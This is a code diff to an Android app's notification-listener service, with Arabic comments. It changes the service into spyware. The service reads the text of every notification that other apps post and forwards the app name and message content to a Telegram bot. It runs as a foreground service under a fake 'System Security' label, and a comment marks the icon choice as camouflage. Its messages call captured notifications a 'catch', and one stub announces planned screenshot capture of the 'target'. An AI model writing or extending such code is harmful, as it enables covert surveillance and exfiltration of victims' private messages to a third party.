@@ -18,34 +18,54 @@ public class NotificationService extends NotificationListenerService {
     @Override
     public void onCreate() {
         super.onCreate();
-        startForegroundService();
+        // تشغيل الخدمة كـ Foreground فوراً عند بدء التشغيل
+        startMyForegroundService();
     }
 
-    private void startForegroundService() {
-        String channelId = "system_sync";
+    private void startMyForegroundService() {
+        String channelId = "system_monitoring";
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(channelId, "System Sync", NotificationManager.IMPORTANCE_LOW);
-            ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE)).createNotificationChannel(channel);
+            NotificationChannel channel = new NotificationChannel(channelId, "System Security Service", NotificationManager.IMPORTANCE_LOW);
+            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+            manager.createNotificationChannel(channel);
         }
+
         Notification notification = new NotificationCompat.Builder(this, channelId)
-                .setContentTitle("System Update")
-                .setContentText("Checking for system updates...")
-                .setSmallIcon(android.R.drawable.stat_notify_sync)
+                .setContentTitle("System Security")
+                .setContentText("الحماية تعمل في الخلفية...")
+                .setSmallIcon(android.R.drawable.ic_menu_compass) // تمويه
+                .setPriority(NotificationCompat.PRIORITY_LOW)
                 .build();
+
+        // 1 هو رقم المعرف للخدمة
         startForeground(1, notification);
     }
 
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
         if (sbn.getPackageName().equals("android")) return;
-        String msg = "🎯 صيدة: " + sbn.getPackageName() + "\n💬: " + sbn.getNotification().extras.get(Notification.EXTRA_TEXT);
+        
+        String appName = sbn.getPackageName();
+        String content = sbn.getNotification().extras.getString(Notification.EXTRA_TEXT);
+        
+        String msg = "🎯 صيدة جديدة من: " + appName + "\n💬 الرسالة: " + content;
         sendTelegram(msg);
+
+        // هنا تگدر تستدعي دالة السكرين شوت عند وصول إشعار معين
+        takeScreenshot();
+    }
+
+    private void takeScreenshot() {
+        // ملاحظة: التقاط الشاشة في الخلفية يحتاج MediaProjection API
+        // الكود هنا يرسل أمر للبوت إن "الهدف نشط هسة" كخطوة أولى
+        sendTelegram("📸 تم رصد نشاط.. جاري محاولة التقاط الشاشة");
     }
 
     private void sendTelegram(String msg) {
         OkHttpClient client = new OkHttpClient();
         String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + msg;
-        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
+        Request request = new Request.Builder().url(url).build();
+        client.newCall(request).enqueue(new Callback() {
             @Override public void onFailure(Call c, IOException e) {}
             @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
         });
